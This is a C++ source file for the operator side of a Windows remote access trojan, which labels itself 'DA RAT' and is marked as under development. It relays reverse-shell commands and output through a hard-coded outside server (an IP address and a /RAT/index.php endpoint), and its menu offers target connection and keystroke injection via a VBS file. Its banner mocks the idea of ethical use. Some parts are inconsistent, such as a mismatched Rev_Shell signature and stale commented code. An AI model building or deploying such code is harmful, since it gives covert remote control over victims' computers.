#include <winsock2.h>
#include <iostream>
#include <ws2tcpip.h>
#include <Windows.h>
#include <string>
#include <thread>
#include <atomic>
#include <sstream>                                                              // Include for stringstream

using namespace std;

#define MAX_IP_LENGTH 16
#define MAX_TEXT_LENGTH 256

int argc_global;
char **argv_global;
//SOCKET listenSocket;
SOCKET sock;
bool targetconnected = false;

char ipAddress[MAX_IP_LENGTH], randomText[MAX_TEXT_LENGTH];
char os;

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
int socket_setup(SOCKET &clientSocket);
string get_client_ip(SOCKET clientSocket);
void safe_closesocket(SOCKET& s);

void send_data(SOCKET clientSocket, const string &filename ,const string &data);
string receive_data(SOCKET clientSocket, const string &filename);

void os_detection();
bool getdata_from_file();
char Get_menu_option();

int Rev_Shell();
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

int main(int argc, char *argv[]) 
{
    argc_global = argc;
    argv_global = argv;
    
    if (socket_setup(sock) != 0) return 1;
    
//     bool loop = true;
//     while(loop)
//     {
//         switch (Get_menu_option())
//         {
//             case '1':                                                                         //connect
//             {   
//                 if(!targetconnected)
//                 {    
//                     if (listen(listenSocket, SOMAXCONN) == SOCKET_ERROR)
//                     {
//                         std::cerr << "listen failed with error: " << WSAGetLastError() << std::endl;
//                         safe_closesocket(listenSocket);
//                         WSACleanup();
                        
//                         return 1;
//                     }               
//                     cout << "\n>> Waiting for incoming connections..." << endl;

//     /////////////////////////////////////////////////////change this when internet////////////////////////////////////////////////
//     // can make if(checkip) and do something....
//                     clientSocket = accept(listenSocket, nullptr, nullptr);                
//                     if(get_client_ip(clientSocket) == "127.0.0.1")
//                     {   
//                         cout << ">> " << get_client_ip(clientSocket) << " connected." << endl;
//                         targetconnected = true;
//                     }
//                     else 
//                     {
//                         cout << ">> " << get_client_ip(clientSocket) << " Not allowed to connect." << endl;
//                         closesocket(clientSocket);
//                     }
//                 }
// /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//                 else
//                 {
//                     cout << ">> Already connected to a target." << endl;
//                     system("pause");                    
//                 }

//                 break;
//             }
            
//             case '2':                                                                     //Rev shell
//             {
//                 if (targetconnected && clientSocket != INVALID_SOCKET) 
//                 {
//                     send_data(clientSocket, "2");
//                     cout << ">> Sent " << endl;
//                 } 
//                 else
//                 {
//                     cout << ">> Target not connected or socket invalid!!" << endl;
//                     system("pause");
//                 }
                
//                 Rev_Shell();

//                 break;
//             }
            
//             case '3':                                                                     //Execute keylogger
//             {
//                 if (targetconnected && clientSocket != INVALID_SOCKET)
//                 {
//                     send_data(clientSocket, "3");
//                     send_data(clientSocket, "hello.vbs");

//                     cout << ">> Sent " << endl;
//                 }
//                 else cout << ">> Target not connected or socket invalid!!" << endl;
//                 system("pause");

//                 break;
//             }
//             case '~':                                                                    //DC Current target
//             {
//                 if (targetconnected)
//                 {
//                     send_data(clientSocket,"~");
//                     safe_closesocket(clientSocket);
//                     safe_closesocket(listenSocket);
//                     targetconnected = false;

//                     if (socket_setup() != 0) return 1;
//                     cout << ">> Disconnecting client..." << endl << endl;
//                 } 
//                 else cout << ">> No client connected to disconnect." << endl;
//                 system("pause");
                
//                 break;
//             }
//             case '#':                                                                    //DC Current target and stop its code execution
//             {
//                 if (targetconnected)
//                 {
//                     send_data(clientSocket,"#");
//                     safe_closesocket(clientSocket);
//                     targetconnected = false;
                    
//                     cout << ">> Disconnecting client and requesting stop..." << endl << endl;
//                 } 
//                 else cout << ">> No client connected to disconnect." << endl;
//                 system("pause");

//                 break;
//             }
//             case '0':                                                                     //Exit console
//             {

//                 if(!targetconnected)
//                 {
//                     safe_closesocket(clientSocket);
//                     safe_closesocket(listenSocket);

//                     WSACleanup();
//                     cout << ">> Exiting..." << endl << endl;
//                     loop = false;
//                 }
//                 else
//                 {
//                     cout << ">> Target not disconnected!!" << endl;
//                     system("pause");
//                 }
//                 break;
//             }
//             default:
//             {
//                 cout << ">> Invalid option ( -_- )" << endl << endl;
//                 system("pause");
//                 break;
//             }
//         }
//     }   

    send_data(sock, "from_server.txt","Hello, client!");
    cout << receive_data(sock,"from_client.txt");
    
    safe_closesocket(sock);
    return 0;
}

int socket_setup(SOCKET &clientSocket)
{
    bool connected = false;

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        std::cerr << "WSAStartup failed.\n";
        return 1;
    }

    clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (clientSocket == INVALID_SOCKET)
    {
        std::cerr << "socket failed.\n";
        WSACleanup();
        return 1;
    }

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(80);
    serverAddr.sin_addr.s_addr = inet_addr("103.92.235.21");

    connected = false;
    while (!connected)
    {
        if (connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
        {
            int error = WSAGetLastError();
            if (error != WSAECONNREFUSED)
            {
                std::stringstream ss;
                ss << "Connection failed with error: " << error << " (" << gai_strerror(error) << "). Retrying in 2 seconds...\n";
                std::cerr << ss.str();
            }   
            else std::cerr << "Connection refused. Retrying in 2 seconds...\n";
            Sleep(2000);
        }
        else
        {
            std::cout << "Connected to the server!\n";
            connected = true;
        }
    }
    return 0;
}

void send_data(SOCKET clientSocket, const string &filename ,const string &data)
{
    string whole_data = filename+data;
    string httpRequest = "POST /RAT/index.php HTTP/1.1\r\n";
    httpRequest += "Host: arth.imbeddex.com\r\n";
    httpRequest += "Content-Length: " + to_string(whole_data.length()) + "\r\n";
    httpRequest += "Content-Type: application/octet-stream\r\n";
    httpRequest += "Connection: keep-alive\r\n\r\n";
    httpRequest += whole_data;                                                         // Append the actual data

    int bytesSent = send(clientSocket, httpRequest.c_str(), httpRequest.length(), 0);
    if (bytesSent == SOCKET_ERROR)
    {
        int error = WSAGetLastError();
        cerr << "Send failed with error: " << error << " (" << gai_strerror(error) << ")" << endl;
    }
}

string receive_data(SOCKET clientSocket, const string &filename)
{
    string httpRequest = "GET /RAT/"+filename+" HTTP/1.1\r\n";
    httpRequest += "Host: arth.imbeddex.com\r\n";
    httpRequest += "Connection: keep-alive\r\n\r\n";

    cout<< httpRequest<<endl;

    int bytesSent = send(clientSocket, httpRequest.c_str(), httpRequest.length(), 0);
    if (bytesSent == SOCKET_ERROR)
    {
        int error = WSAGetLastError();
        cerr << "Send failed with error: " << error << " (" << gai_strerror(error) << ")" << endl;
    }

    /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    char buffer[4096]; // Increased buffer size
    string receivedData;
    int bytesReceived;

    do {
        bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0); // Leave space for null terminator

        if (bytesReceived > 0) {
            buffer[bytesReceived] = '\0';
            receivedData += buffer; // Append to the received data
        } else if (bytesReceived == 0) {
            cerr << "Connection closed by server." << endl;
            break; // Exit the loop on clean close
        } else {
            int error = WSAGetLastError();
            if (error != WSAECONNRESET) {
                cerr << "Receive failed with error: " << error << " (" << gai_strerror(error) << ")" << endl;
            }
            break; // Exit loop on error
        }
    } while (bytesReceived == sizeof(buffer) - 1); // Continue if buffer was full

    cout << "Response ->\n"<<bytesReceived;

    ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    // Robust HTTP response parsing
    size_t headerEnd = receivedData.find("\r\n\r\n");
    if (headerEnd == string::npos) {
        cerr << "Invalid HTTP receivedData: No header/body separator found." << endl;
        return "";
    }

    string body = receivedData.substr(headerEnd + 4);

    //Handle chunked transfer encoding (if present)
    size_t transferEncodingPos = receivedData.find("Transfer-Encoding: chunked");
    if (transferEncodingPos != string::npos)
    {
        string unchunkedBody;
        istringstream bodyStream(body);
        string chunkLengthStr;

        while (getline(bodyStream, chunkLengthStr))
        {
            if (chunkLengthStr.empty() || chunkLengthStr == "\r") continue;

            size_t chunkSize;
            stringstream ss;
            ss << hex << chunkLengthStr;
            ss >> chunkSize;

            if (chunkSize == 0) break; // End of chunked data

            string chunkData(chunkSize, '\0');
            bodyStream.read(&chunkData[0], chunkSize);

            unchunkedBody += chunkData;
            bodyStream.ignore(2); // Consume CRLF after chunk
        }
        body = unchunkedBody;
    }
    return body;
}

void os_detection()
{
    #if defined(_WIN32) || defined(_WIN64)
        os = 'W';
    #elif defined(__linux__)
        os = 'L';
    #elif defined(__APPLE__) || defined(__MACH__)
        os = 'M';
    #elif defined(__unix__) || defined(__unix)
        os = 'U';
    #endif
}

bool getdata_from_file()
{
    FILE *sourceFile;
    const char *fileName = NULL;


    if (argc_global < 3) return false;

    if (strcmp(argv_global[1], "-f") == 0) fileName = argv_global[2];
    else return false;


    sourceFile = fopen(fileName, "r");
    if (sourceFile == NULL)
    {
        perror("\n\n\t|||||| Failed to open file ||||||\n\n");
        return false;
    }


    while (fscanf(sourceFile, "%15s", ipAddress) == 1)                                                // Read the IP address
    {        
        fgetc(sourceFile);                                                                            // Consume the newline character left by fscanf
        if (fgets(randomText, MAX_TEXT_LENGTH, sourceFile) != NULL)                                   // Read the random text
        {
            randomText[strcspn(randomText, "\n")] = '\0';                                             // Remove the newline character if it exists in randomText
        }
    }

    fclose(sourceFile);

    return true;
}

int Rev_Shell(SOCKET clientSocket)
{
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    atomic<bool> processFinished(false);
    
    auto readThread = std::thread([&]()
    {
        while (!processFinished.load())
        {
            string data = receive_data(clientSocket, "from_client.txt");
            if (data.empty()) break;                                                            // Client has disconnected or there was an error
            cout << data;
            Sleep(10);                                                                          // Sleep for a short time to prevent 100% CPU usage
        }
    });

    auto writeThread = std::thread([&]()
    {
        string cmd;
        while (!processFinished.load())                                                                     
        {
            if (getline(cin, cmd))                                                              //getline to allow multi-word commands
            {
                if (cmd == "exit")
                {
                    send_data(clientSocket, "from_server.txt" ,"exit");
                    processFinished.store(true);
                    break;
                }
                send_data(clientSocket, "from_server.txt" ,cmd);
            }
            Sleep(10);
        }
    });

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    
    // Wait for process threads to finish
    readThread.join();
    writeThread.join();
    processFinished.store(true);

    return 0;
}

char Get_menu_option()
{
    char option;

    system("cls");
    cout << R"(


                                  :::::::::      :::           :::::::::      ::: ::::::::::: 
                                 :+:    :+:   :+: :+:         :+:    :+:   :+: :+:   :+:      
                                +:+    +:+  +:+   +:+        +:+    +:+  +:+   +:+  +:+       
                               +#+    +:+ +#++:++#++:       +#++:++#:  +#++:++#++: +#+        
                              +#+    +#+ +#+     +#+       +#+    +#+ +#+     +#+ +#+         
                             #+#    #+# #+#     #+#       #+#    #+# #+#     #+# #+#          
                            #########  ###     ###       ###    ### ###     ### ###           

                                            [::] Made By Oorth :) [::]              
                                    
                                    [::] Use this Ethically, if you dont [::]
                                        [::] I'll just enjoy watching  [::]

                                            [::] UNDER DEVELOPMENT!! [::]
          
                            _________________________________________________________
                                                
                                                [::] Menu :) [::]

                                    Connect a target                        1)";
    
    if(!targetconnected) cout << "  [-]\n";
    else cout << "  [o]\n";

    cout << R"(
                                    Rev Shell                               2
                                    KeyStroke Injection                     3
                                                                            )";            
                                    
    if(targetconnected)cout << R"(
                                    Disconnect Current Target              [~]
                                    DC target & stop its code              {#}
                                                                            )";

    cout << R"(
                                    Exit                                    0)";

    cout << "\n\n>> ";
    cin >> option;

    // if(cin.fail())
    // {
    //     cin.clear();
    //     cout << ">> INT Bro, Int ( -_- )" << endl << endl;
    //     system("pause");
    // }


    return option;

}

string get_client_ip(SOCKET clientSocket)
{
    sockaddr_in clientAddr;
    int clientAddrLen = sizeof(clientAddr);
    if (getpeername(clientSocket, (sockaddr*)&clientAddr, &clientAddrLen) == SOCKET_ERROR) {
        cerr << "getpeername failed." << endl;
        return "";
    }

    // Convert IP address to string
    char clientIP[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &clientAddr.sin_addr, clientIP, sizeof(clientIP));
    return string(clientIP);
}

void safe_closesocket(SOCKET& s) 
{
    if (s != INVALID_SOCKET) {
        shutdown(s, SD_BOTH); // Prevent further sends/receives
        closesocket(s);
        s = INVALID_SOCKET; // Set to INVALID_SOCKET to prevent double closing
    }
}